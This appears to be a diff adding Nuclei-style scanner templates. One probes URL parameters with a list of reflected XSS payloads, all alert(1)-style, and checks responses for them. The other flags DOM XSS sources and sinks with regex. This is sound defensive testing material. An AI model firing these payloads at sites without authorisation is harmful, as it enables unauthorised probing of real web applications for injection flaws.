@@ -1,0 +1,98 @@
+id: xss-reflected
+
+info:
+  name: Cross-Site Scripting (XSS) - Reflected
+  author: ancarna
+  severity: medium
+  description: Detects reflected XSS vulnerabilities by injecting script payloads
+  tags: xss,injection,owasp-top10
+  classification:
+    cwe-id: 79
+  reference:
+    - https://owasp.org/www-community/attacks/xss/
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{path}}?{{param}}={{payload}}"
+    payloads:
+      payload:
+        - "<script>alert(1)</script>"
+        - "<script>alert('XSS')</script>"
+        - "<img src=x onerror=alert(1)>"
+        - "<svg onload=alert(1)>"
+        - "<body onload=alert(1)>"
+        - "javascript:alert(1)"
+        - "<iframe src=javascript:alert(1)>"
+        - "'><script>alert(1)</script>"
+        - "\"><script>alert(1)</script>"
+        - "</title><script>alert(1)</script>"
+        - "</textarea><script>alert(1)</script>"
+        - "<img src=1 onerror=alert(1)>"
+        - "<svg/onload=alert(1)>"
+        - "<input onfocus=alert(1) autofocus>"
+        - "<marquee onstart=alert(1)>"
+        - "<details open ontoggle=alert(1)>"
+        - "<math><maction actiontype=statusline#http://google.com xlink:href=javascript:alert(1)>CLICKME"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+          - 302
+
+      - type: word
+        part: body
+        words:
+          - "<script>alert(1)</script>"
+          - "<script>alert('XSS')</script>"
+          - "<img src=x onerror=alert(1)>"
+          - "<svg onload=alert(1)>"
+          - "<body onload=alert(1)>"
+          - "<iframe src=javascript:alert(1)>"
+          - "<img src=1 onerror=alert(1)>"
+          - "<svg/onload=alert(1)>"
+          - "<input onfocus=alert(1) autofocus>"
+          - "<marquee onstart=alert(1)>"
+          - "<details open ontoggle=alert(1)>"
+        condition: or
+
+---
+id: xss-dom-sources
+
+info:
+  name: Cross-Site Scripting (XSS) - DOM Sources
+  author: ancarna
+  severity: low
+  description: Detects potential DOM-based XSS by identifying vulnerable JavaScript sources
+  tags: xss,dom,javascript
+  classification:
+    cwe-id: 79
+  reference:
+    - https://owasp.org/www-community/attacks/DOM_Based_XSS
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{path}}"
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "document\\.write\\s*\\(.*location"
+          - "document\\.writeln\\s*\\(.*location"
+          - "innerHTML\\s*=.*location"
+          - "outerHTML\\s*=.*location"
+          - "eval\\s*\\(.*location"
+          - "setTimeout\\s*\\(.*location"
+          - "setInterval\\s*\\(.*location"
+          - "document\\.URL"
+          - "document\\.documentURI"
+          - "document\\.referrer"
+          - "window\\.name"
+          - "location\\.hash"
+          - "location\\.search"
+          - "location\\.href"
